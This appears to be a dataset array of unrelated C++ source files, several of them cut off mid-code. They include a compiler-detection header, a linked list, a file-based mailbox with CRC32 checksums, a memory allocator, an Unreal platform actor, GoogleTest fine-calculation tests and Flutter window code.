    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP */\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n# if defined(__INTEL_COMPILER_UPDATE)\n#  define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n# else\n#  define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n  /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ = VVRP + 1100 */\n# define COMPILER_VERSION_MAJOR DEC((__WATCOMC__ - 1100) / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__SUNPRO_CC)\n# define COMPILER_ID \"SunPro\"\n# if __SUNPRO_CC >= 0x5100\n   /* __SUNPRO_CC = 0xVRRP */\n#  define COMPILER_VERSION_MAJOR HEX(__SUNPRO_CC>>12)\n#  define COMPILER_VERSION_MINOR HEX(__SUNPRO_CC>>4 & 0xFF)\n#  define COMPILER_VERSION_PATCH HEX(__SUNPRO_CC    & 0xF)\n# else\n   /* __SUNPRO_CC = 0xVRP */\n#  define COMPILER_VERSION_MAJOR HEX(__SUNPRO_CC>>8)\n#  define COMPILER_VERSION_MINOR HEX(__SUNPRO_CC>>4 & 0xF)\n#  define COMPILER_VERSION_PATCH HEX(__SUNPRO_CC    & 0xF)\n# endif\n\n#elif defined(__HP_aCC)\n# define COMPILER_ID \"HP\"\n  /* __HP_aCC = VVRRPP */\n# define COMPILER_VERSION_MAJOR DEC(__HP_aCC/10000)\n# define COMPILER_VERSION_MINOR DEC(__HP_aCC/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__HP_aCC     % 100)\n\n#elif defined(__DECCXX)\n# define COMPILER_ID \"Compaq\"\n  /* __DECCXX_VER = VVRRTPPPP */\n# define COMPILER_VERSION_MAJOR DEC(__DECCXX_VER/10000000)\n# define COMPILER_VERSION_MINOR DEC(__DECCXX_VER/100000  % 100)\n# define COMPILER_VERSION_PATCH DEC(__DECCXX_VER         % 10000)\n\n#elif defined(__IBMCPP__) && defined(__COMPILER_VER__)\n# define COMPILER_ID \"zOS\"\n  /* __IBMCPP__ = VRP */\n# define COMPILER_VERSION_MAJOR DEC(__IBMCPP__/100)\n# define COMPILER_VERSION_MINOR DEC(__IBMCPP__/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__IBMCPP__    % 10)\n\n#elif defined(__ibmxl__) && defined(__clang__)\n# define COMPILER_ID \"XLClang\"\n# define COMPILER_VERSION_MAJOR DEC(__ibmxl_version__)\n# define COMPILER_VERSION_MINOR DEC(__ibmxl_release__)\n# define COMPILER_VERSION_PATCH DEC(__ibmxl_modification__)\n# define COMPILER_VERSION_TWEAK DEC(__ibmxl_ptf_fix_level__)\n\n\n#elif defined(__IBMCPP__) && !defined(__COMPILER_VER__) && __IBMCPP__ >= 800\n# define COMPILER_ID \"XL\"\n  /* __IBMCPP__ = VRP */\n# define COMPILER_VERSION_MAJOR DEC(__IBMCPP__/100)\n# define COMPILER_VERSION_MINOR DEC(__IBMCPP_",
    "#include <bits/stdc++.h>\n\nusing namespace std;\n\nclass node {\npublic:\n    node *next;\n    int data;\n\n    node(int val) {\n        data = val;\n        next = nullptr;\n    }\n\n};\n\nclass linkedList {\npublic:\n    node *head;\n\n    linkedList() {\n        head = nullptr;\n    }\n\n    void add(int val) {\n        node *newNode = new node(val);\n        if (head == nullptr){\n            head = newNode;\n            return;\n        }\n        node* temp = head;\n        while(temp->next != nullptr){\n            temp = temp->next;\n        }\n        temp->next = newNode;\n    }\n\n    void insertAt(int pos, int val) {\n        if (pos < 0) {\n            cout << \"invalid position\\n\";\n            return;\n        }\n        node *newNode = new node(val);\n        node *temp = head;\n        for (int i = 0; i < pos - 2 && temp != nullptr; ++i) {\n            temp = temp->next;\n        }\n        if (temp == nullptr) {\n            cout << \"out of range position\\n\";\n            return;\n        }\n        newNode->next = temp->next;\n        temp->next = newNode;\n\n    }\n\n    void deleteNode(int val){\n        if(head== nullptr){\n            cout<<\"list is empty\\n\";\n        }\n        if(head->data==val){\n            cout<<\"deleted \"<<val<<el;\n            node *temp = head;\n            head = head->next;\n            delete temp;\n            return;\n        }\n        node* temp = head;\n        while(temp->next!= nullptr && temp->next->data!=val){\n            temp = temp->next;\n        }\n        if (temp->next == nullptr){\n            cout<<\"val \"<< val<< \" not found\\n\";\n            return;\n        }\n        node* toDEL = temp->next;\n        temp->next = temp->next->next;\n        delete toDEL;\n        cout<<\"deleted \"<<val<<el;\n    }\n\n    void print() const {\n        node* temp = head;\n        while (temp != nullptr){\n            cout<<temp->data<<' ';\n            temp = temp->next;\n        }\n        cout<<el;\n    }\n};\n\nint main() {\n    linkedList x;\n    x.add(1);\n    x.add(2);\n    x.add(7);\n    x.add(12);\n    x.add(2);\n    x.print();\n    x.insertAt(3,33);\n    x.print();\n    x.deleteNode(2);\n    x.print();\n    x.deleteNode(4);\n    x.print();\n}\n\n\n",
    "#include <iostream>\n#include <string>\n#include <unordered_map>\n#include <vector>\n\nusing namespace std;\n\nclass Student {\nprivate:\n    string name;\n    string hobby;\n\npublic:\n    Student(const string& name, const string& hobby) : name(name), hobby(hobby) {}\n\n    string getName() const {\n        return name;\n    }\n\n    string getHobby() const {\n        return hobby;\n    }\n};\n\n\nvoid selectGroup(Student* students, int size) {\n    unordered_map<string, vector<string>> groups;\n    for (int i = 0; i < size; ++i) {\n        string hobby = students[i].getHobby();\n        groups[hobby].push_back(students[i].getName());\n    }\n\n    for (const auto& pair : groups) {\n        cout << \"Group with hobby '\" << pair.first << \"':\" << endl;\n        for (const auto& student : pair.second) {\n            cout << student << endl;\n        }\n        cout << endl;\n    }\n}\n\nint main() {\n   Student students[] = {\n        Student(\"Ivan\", \"music\"),\n        Student(\"Max\", \"gym\"),\n        Student(\"Alex\", \"gym\"),\n        Student(\"Masha\", \"music\"),\n        Student(\"Pasha\", \"art\"),\n        Student(\"Vova\", \"gym\"),\n    };\n\n    selectGroup(students, sizeof(students) / sizeof(students[0]));\n \n    return 0;\n}\n",
    "#include \"lb4mailbox.h\"\n\n#include <cstring>\n#include <fstream>\n#include <filesystem>\n\nchar UINT_RW_ARR[4];\n\nuint32_t crc32(const char* buf, uint32_t size) {\n    uint32_t crc = 0xFFFFFFFF;\n    while (size--) {\n        crc ^= *buf++;\n        for (int k = 0; k < 8; k++)\n            crc = crc & 1 ? crc >> 1 ^ 0x82f63b78 : crc >> 1;\n    }\n    return ~crc;\n}\n\nuint32_t readUint32(std::fstream& file) {\n    uint32_t result;\n    file.read(UINT_RW_ARR, 4);\n    memcpy(&result, UINT_RW_ARR, 4);\n\n    return result;\n}\n\nuint32_t readUint32(std::ifstream& file) {\n    return readUint32((std::fstream&)file);\n}\n\n\nMailboxEntry::MailboxEntry(const char* content, const uint32_t size) {\n    this->content_size = content[size-1] == '\\0' ? size - 1 : size;\n    this->content = new char[size];\n    memcpy(this->content, content, size);\n\n    this->checksum = crc32(this->content, this->content_size);\n}\n\nMailboxEntry::MailboxEntry(const std::string& content) {\n    this->content_size = content.size();\n    this->content = new char[this->content_size];\n    memcpy(this->content, content.c_str(), this->content_size);\n\n    this->checksum = crc32(this->content, this->content_size);\n}\n\nstd::string MailboxEntry::getContent() {\n    return std::string(content);\n}\n\n\nvoid MailboxEntry::write(std::ofstream& file) {\n    memcpy(UINT_RW_ARR, &content_size, 4);\n    file.write(UINT_RW_ARR, 4);\n\n    memcpy(UINT_RW_ARR, &checksum, 4);\n    file.write(UINT_RW_ARR, 4);\n\n    file.write(content, content_size);\n}\n\nMailBox::MailBox(const std::string& name) {\n    filename = name;\n\n    std::ifstream file(name, std::ios::binary);\n    max_size = readUint32(file);\n    current_index = readUint32(file);\n\n    file.seekg(0, std::ios::end);\n    const long size = file.tellg();\n    file.close();\n    if(size < max_size + 8)\n        throw std::underflow_error(\"Size if mailbox is too small!\");\n}\n\nMailBox::MailBox(const std::string& name, const uint32_t max_size) {\n    filename = name;\n    this->max_size = max_size;\n\n    std::ofstream file(name, std::ios::binary | std::ios::trunc);\n    memcpy(UINT_RW_ARR, &max_size, 4);\n    file.write(UINT_RW_ARR, 4);\n    memcpy(UINT_RW_ARR, &current_index, 4);\n    file.write(UINT_RW_ARR, 4);\n\n    uint32_t tmp = 0;\n    for(int i = 0; i < max_size; i++) {\n        memcpy(UINT_RW_ARR, &tmp, 4);\n        file.write(UINT_RW_ARR, 4);\n    }\n\n    file.close();\n}\n\nuint32_t MailBox::getMaxSize() {\n    return max_size;\n}\n\nuint32_t MailBox::getEntriesCount() {\n    return current_index;\n}\n\nuint64_t MailBox::getCurrentSize() {\n    std::ifstream file(filename, std::ios::binary);\n    uint64_t total_size = 0;\n\n    file.seekg(8);\n\n    for(uint32_t i = 0; i < current_index; i++) {\n        uint32_t tmp = readUint32(file);\n\n        uint32_t current_pos = file.tellg();\n        file.seekg(max_size*4+8+tmp);\n\n        total_size += readUint32(file);\n\n        file.seekg(current_pos);\n    }\n\n    file.close();\n\n    return total_size;\n}\n\nvoid MailBox::addEntry(MailboxEntry* entry) {\n    if(current_index >= max_size)\n        throw std::overflow_error(\"Mailbox is full!\");\n\n    std::ofstream file(filename, std::ios::ate | std::ios::in | std::ios::out | std::ios::binary);\n\n    const uint32_t ptr = (long)file.tellp() - (max_size*4+8);\n    entry->write(file);\n\n    file.seekp(current_index*4+8);\n    memcpy(UINT_RW_ARR, &ptr, 4);\n    file.write(UINT_RW_ARR, 4);\n\n    current_index++;\n\n    file.seekp(4);\n    memcpy(UINT_RW_ARR, &current_index, 4);\n    file.write(UINT_RW_ARR, 4);\n\n    file.close();\n}\n\nMailboxEntry* MailBox::readEntry(const uint32_t index, const bool del) {\n    if(index >= current_index)\n        throw std::range_error(\"Requested mail entry does not exist!\");\n\n    std::ifstream file(filename, std::ios::binary);\n\n    file.seekg(8+(index*4));\n    uint32_t tmp = readUint32(file);\n\n    file.seekg(max_size*4+8+tmp);\n\n    uint32_t size = readUint32(file);\n    uint32_t checksum = readUint32(file);\n\n    char* content = new char[size+1];\n    file.read(content, size);\n    content[size] = '\\0';\n    file.close();\n\n    if(crc32(content, size) != checksum)\n        throw std::runtime_error(\"Mail entry checksum mismatch!\");\n\n    auto* entry = new MailboxEntry(content, size+1);\n\n    delete[] content;\n\n    if(del)\n        deleteEntry(index);\n\n    return entry;\n}\n\nvoid MailBox::deleteEntry(uint32_t index) {\n    if(index >= current_index)\n        throw std::range_error(\"Requested mail entry does not exist!\");\n    std::fstream file(filename, std::ios::ate | std::ios::in | std::ios::out | std::ios::binary);\n\n    file.seekg(8+(index*4));\n    uint32_t tmp = readUint32(file);\n    file.seekg(8+(max_size*4) + tmp);\n    tmp = readUint32(file);\n    uint32_t bytes_to_move = tmp + 8;\n\n    uint32_t indexes_to_move = current_index - index - 1;\n    char* indexes = new char[indexes_to_move * 4];\n\n    file.seekg(8 + (4 * index)+4);\n    file.read(indexes, indexes_to_move * 4);\n\n    file.seekp(8 + (4 * index));\n    file.write(indexes, indexes_to_move * 4);\n\n    delete[] indexes;\n\n    current_index--;\n\n    file.s",
    "#include \"MemoryManager.h\"\n\nint bestFit(int sizeInWords, void* list) {\n    uint16_t* holeList = (uint16_t*)list;\n    if (holeList == nullptr) {\n        return -1;\n    }\n\n    //iterates through each hole given in list and determines if it is large enough for sizeInWords and if it is the smallest hole\n    int offset = -1;\n    int size = INT_MAX;\n    int index = 2;\n    for (int i = 0; i < holeList[0]; i++) {\n        if (holeList[index] >= sizeInWords && holeList[index] <= size) {\n            size = holeList[index];\n            offset = holeList[index-1];\n        }\n        index += 2;\n    }\n    return offset;\n}\nint worstFit(int sizeInWords, void* list) {\n    uint16_t* holeList = (uint16_t*)list;\n    if (holeList == nullptr) {\n        return -1;\n    }\n\n    //iterates through each hole given in list and determines if it is large enough for sizeInWords and if it is the biggest hole\n    int offset = -1;\n    int size = 0;\n    int index = 2;\n    for (int i = 0; i < holeList[0]; i++) {\n        if (holeList[index] >= sizeInWords && holeList[index] >= size) {\n            size = holeList[index];\n            offset = holeList[index-1];\n        }\n        index += 2;\n    }\n    return offset;\n}\n\n\n\n//constructor\nMemoryManager::MemoryManager(unsigned wordSize, std::function<int(int, void*)> allocator) {\n    this->wordSize = wordSize;\n    this->allocator = allocator;\n}\n\n//destructor\nMemoryManager::~MemoryManager() {\n    shutdown();\n}\n\n//initialize the block of memory\nvoid MemoryManager::initialize(size_t sizeInWords) {\n    if (block != nullptr) {\n        shutdown();\n    }\n    if (initialized) {\n        shutdown();\n    }\n    //set the block size and create a new memory block and chunk of memory as a hole in the vector\n    if (sizeInWords < 65536) {\n        blockSize = wordSize * sizeInWords;\n        block = new char[blockSize];\n        Chunk chunk = Chunk(0, sizeInWords, true);\n        chunks.push_back(chunk);\n        initialized = true;\n    }\n}\n\n//dynamically deletes all memory allocated\nvoid MemoryManager::shutdown() {\n    if (initialized) {\n        delete[] block;\n        block = nullptr;\n        chunks.clear();\n        initialized = false;\n    } \n}\n\n//allocate memory on the block and determines holes\nvoid* MemoryManager::allocate(size_t sizeInBytes) {\n    //calculates size on the memory block to allocate\n    int wordsToAllocate;\n    if (sizeInBytes % getWordSize() != 0) {\n        wordsToAllocate = sizeInBytes/getWordSize() + 1;\n    } else {\n        wordsToAllocate = sizeInBytes/getWordSize();\n    }\n\n    uint16_t* holeList = (uint16_t*)getList();\n\n    //set the fit algorithm and find the offset of where to place the new chunk\n    int offset = allocator(wordsToAllocate, holeList);\n    delete[] holeList;\n    if (offset == -1) {\n        return nullptr;\n    }\n\n    Chunk chunk = Chunk(offset, wordsToAllocate, false);\n    \n    //finds the hole chunk in chunks vector\n    int index;\n    for (int i = 0; i < chunks.size(); i++) {\n        if (chunks[i].offset == chunk.offset) {\n            index = i;\n            break;\n        }\n    }\n    \n    //if the new chunk takes up the length of the hole (delete hole)\n    if (chunk.length == chunks[index].length) {\n        chunks.insert(chunks.begin()+index, chunk);\n        chunks.erase(chunks.begin() + (index+1));\n    } else {\n        //shorten hole\n        chunks[index].offset += chunk.length;\n        chunks[index].length -= chunk.length;\n        chunks.insert(chunks.begin()+index, chunk);\n    }\n\n    return block + (offset*getWordSize());\n}\n\n//frees the provided memory block and merges any holes\nvoid MemoryManager::free(void* address) {\n    int offset = ((char*)address - block)/getWordSize();\n\n    //finds the chunk at the offset\n    int index = -1;\n    for (int i = 0; i < chunks.size(); i++) {\n        if (!chunks[i].isHole && chunks[i].offset == offset) {\n            index = i;\n            break;\n        }\n    }\n\n    if (index == -1) {\n        return;\n    }\n    \n    chunks[index].isHole = true;\n\n    //if to the right is a hole merge    \n    if (index+1 < chunks.size() && chunks[index+1].isHole) {\n        chunks[index].length += chunks[index+1].length;\n        chunks.erase(chunks.begin() + index + 1);\n        chunks[index].isHole = true;\n    }\n    \n    //if to the left is a hole merge\n    if (index-1 >= 0 && chunks[index-1].isHole) {\n        chunks[index].offset = chunks[index-1].offset;\n        chunks[index].length += chunks[index-1].length;\n        chunks[index].isHole = true;\n        chunks.erase(chunks.begin()+index-1);\n    }\n\n}\n\nvoid MemoryManager::setAllocator(std::function<int(int, void*)> allocator) {\n    this->allocator = allocator;\n}\n\nint MemoryManager::dumpMemoryMap(char* filename) {\n    //open file descriptor\n    int fd = open(filename, O_CREAT | O_RDWR | O_TRUNC, 0777);\n    if (fd == -1) {\n        return -1;\n    }\n\n    //get list of holes and format the output string\n    uint16_t* holeList = (uint16_t*)getList();\n    string output;\n    int index = 1;\n    for (int i = 0; i < holeList[",
    "// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"MovingPlatform.h\"\n\n// Sets default values\nAMovingPlatform::AMovingPlatform()\n{\n \t// Set this actor to call Tick() every frame.  You can turn this off to improve performance if you don't need it.\n\tPrimaryActorTick.bCanEverTick = true;\n\n}\n\n// Called when the game starts or when spawned\nvoid AMovingPlatform::BeginPlay()\n{\n\tSuper::BeginPlay();\n\n\tStartLocation = GetActorLocation();\n\n\tFString Name = GetName();\n\n\tUE_LOG(LogTemp, Display, TEXT(\"BeginPlay: %s\"), *Name);\n}\n\nvoid AMovingPlatform::Unpause()\n{\n\tisPaused = false;\n}\n\n// Called every frame\nvoid AMovingPlatform::Tick(float DeltaTime)\n{\n\tSuper::Tick(DeltaTime);\n\tif (!isPaused)\n\t{\n\t\tMovePlatform(DeltaTime);\n\t}\n\tRotatePlatform(DeltaTime);\n}\n\nvoid AMovingPlatform::MovePlatform(float DeltaTime)\n{\n\tif (ShouldPlatformReturn())\n\t{\n\t\tisPaused = true;\n\t\tFVector MoveDirection = PlatformVelocity.GetSafeNormal();\n\t\tStartLocation = StartLocation + MoveDirection * MoveDistance;\n\t\tSetActorLocation(StartLocation);\n\t\tFTimerHandle UniqueHandle;\n\t\tFTimerDelegate RespawnDelegate = FTimerDelegate::CreateUObject(this, &AMovingPlatform::Unpause);\n\t\tGetWorldTimerManager().SetTimer(UniqueHandle, RespawnDelegate, 2, false);\n\t\tPlatformVelocity = -PlatformVelocity;\n\t}\n\telse\n\t{\n\t\tFVector CurrentLocation = GetActorLocation();\n\t\tCurrentLocation = CurrentLocation + (PlatformVelocity * DeltaTime);\n\t\tSetActorLocation(CurrentLocation);\n\t}\n}\n\nvoid AMovingPlatform::RotatePlatform(float DeltaTime)\n{\n\tFRotator CurrentRotation = GetActorRotation();\n\tCurrentRotation = CurrentRotation + RotationVelocity * DeltaTime;\n\tSetActorRotation(CurrentRotation);\n}\n\nbool AMovingPlatform::ShouldPlatformReturn() const\n{\n\treturn GetDistanceMoved() > MoveDistance;\n}\n\nfloat AMovingPlatform::GetDistanceMoved() const\n{\n\treturn FVector::Dist(StartLocation, GetActorLocation());\n}\n",
    "#include \"pch.h\"\n#include <gtest/gtest.h>\n#include <string>\n#include \"speeding_fine.h\"\n\n// Test case for speeding_fine function when vehicle type is invalid (0)\nTEST(SpeedingFineTest, InvalidVehicleType) {\n    EXPECT_EQ(speeding_fine(0, 0), \"Loai phuong tien khong hop le\");\n}\n\n// Test case for speeding_fine function with different speeds for car (vehicle type 1)\nTEST(SpeedingFineTest, CarSpeedingFines) {\n    EXPECT_EQ(speeding_fine(1, 120), \"Muc phat tien: Tu 10.000.000 VND den 12.000.000 VND\");\n    EXPECT_EQ(speeding_fine(1, 100), \"Muc phat tien: Tu 6.000.000 VND den 8.000.000 VND\");\n    EXPECT_EQ(speeding_fine(1, 85), \"Muc phat tien: Tu 4.000.000 VND den 6.000.000 VND\");\n    EXPECT_EQ(speeding_fine(1, 80), \"Muc phat tien: Tu 800.000 VND den 1.000.000 VND\");\n    EXPECT_EQ(speeding_fine(1, 70), \"Khong bi phat\");\n}\n\n// Test case for speeding_fine function with different speeds for motorcycle (vehicle type 2)\nTEST(SpeedingFineTest, MotorcycleSpeedingFines) {\n    EXPECT_EQ(speeding_fine(2, 100), \"Muc phat tien: Tu 4.000.000 VND den 5.000.000 VND\");\n    EXPECT_EQ(speeding_fine(2, 85), \"Muc phat tien: Tu 800.000 VND den 1.000.000 VND\");\n    EXPECT_EQ(speeding_fine(2, 80), \"Muc phat tien: Tu 300.000 VND den 400.000 VND\");\n    EXPECT_EQ(speeding_fine(2, 70), \"Khong bi phat\");\n}\n\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <iostream>\n#include <string>\n#include <vector>\n\nusing namespace std;\n\nclass Item{\nprivate:\n    string name;\npublic:\n    Item(const string &n) : name(n) {}\n\n    // methods using upcasting (converting a derived class obj to a base class obj)\n    virtual const string &getName() const // the private data member can not be modified since it's a const reference\n    {\n        return name;\n    }\n    virtual const int &getSize() const\n    {\n        return 0;\n    }\n    /* VAR1:\n    virtual ostream& display(ostream& out) const // in this case, the classes file and directory must display the assigned name, then a file must include other details\n    {\n        return out<<name;\n    } */\n    /* VAR2\n    friend ostream &operator<<(ostream &out, const Item &obj)\n    {\n        out<<obj.getName(); // name is a private member, therefore i must use getName()\n        return out;\n    }*/\n    virtual void display(ostream& out) const = 0; // pure virtual function that is also defined in the derived classes\n    friend ostream &operator<<(ostream &out, const Item &obj) // overloading operator<< only in the base class\n    {\n        obj.display(out);\n        return out;\n    }\n};\n\nclass File : public Item{\nprivate:\n    int size;\n    string extension;\npublic:\n    File(const string &n, const string &ext, int s) : Item(n), extension(ext), size(s) {}\n    File(const string &n, const string &ext) : Item(n), extension(ext) {}\n    const int &getSize() const override\n    {\n        return size;\n    }\n    const string &getExtension() const\n    {\n        return extension;\n    }\n    /* VAR1:\n    ostream& display(ostream& out) const override\n    {\n        return Item::display(out)<<\".\"<<extension<<\" \"<<size; // using scope resolution operator since we must access the method display() defined in the base class item\n    }*/\n    /* VAR2\n    friend ostream &operator<<(ostream &out, const File &obj)\n    {\n        out<<static_cast<const Item &>(obj); // upcasting since we must convert a derived class pointer to the base class pointer (any file has a name, which is an item's attribute)\n        out<<\".\"<<obj.getExtension()<<\" \"<<obj.getSize();\n        return out;\n    }*/\n    void display(ostream& out) const override\n    {\n        out<<getName()<<\".\"<<extension<<\" \"<<size;\n    }\n};\n\nclass Directory : public Item{\nprivate:\n    vector<Item *> path;\npublic:\n    Directory(const string &n) : Item(n) { path.clear(); } // there's no need to declare the vector variable here\n    ~Directory()\n    {\n        if(!this->path.empty())\n        {\n            this->path.clear();\n        }\n    }\n    void addItem(Item *obj) // pointing at an item\n    {\n        path.push_back(obj); // adding objects to the current directory path\n    }\n    Directory *navigateTo(const string& name) // function which returns a pointer to a directory\n    {\n        // for every item located within the path, declared as references\n        // might have to implement exception handling block\n        for (const auto& item : path)\n        {\n            // if the name corresponds and it is a directory\n            if (item->getName() == name && dynamic_cast<Directory*>(item)) // we must use dynamic_cast since the item should be checked whether it is a directory or not\n            {\n                return dynamic_cast<Directory*>(item);\n            }\n        }\n        return nullptr;\n    }\n    void addDirectory(const string& name)\n    {\n        Directory *new_dir = new Directory(name);\n        addItem(new_dir); // addItem() is part of the directory class methods (don't be mistaken), otherwise i should've used the scope resolution operator\n    }\n    int getNumberOfItems() // the number of direct children nodes is the size on the path vector for the current directory\n    {\n        return path.size(); // size() instead of length() since we use elements in the vector path of type pointer\n    }\n    int getSize()\n    {\n        int total_size = 0;\n        for(const auto &item : path)\n        {\n            Directory *subdir = dynamic_cast<Directory*>(item);\n            if(subdir)\n            {\n                total_size += subdir->getSize(); // sizes of files located in each subdir\n            } else\n            {\n                total_size += item->getSize();\n            }\n        }\n        return total_size;\n    }\n    void syntaxHelper(std::ostream& out, int k) const\n    {\n        for (int i = 0; i < k; i++)\n        {\n            out<<\" \"; // increasing the indentation in relation to directory-subdirectory depth\n        }\n        if (k == 1)\n        {\n            out<<\"|-\"; // hyphen = the immediate nodes located within the parent folder\n        } else if (k != 0)\n        {\n            out<<\"|_\"; // underscore = every other level of items contained in the parent's folder direct children\n        }\n    }\n    /* VAR 1/2: friend ostream &operator<<(ostream &out, const Directory &obj) // operator<< overloading\n    {\n        // the indentation is specific to every level, meaning it should be consistent for items",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        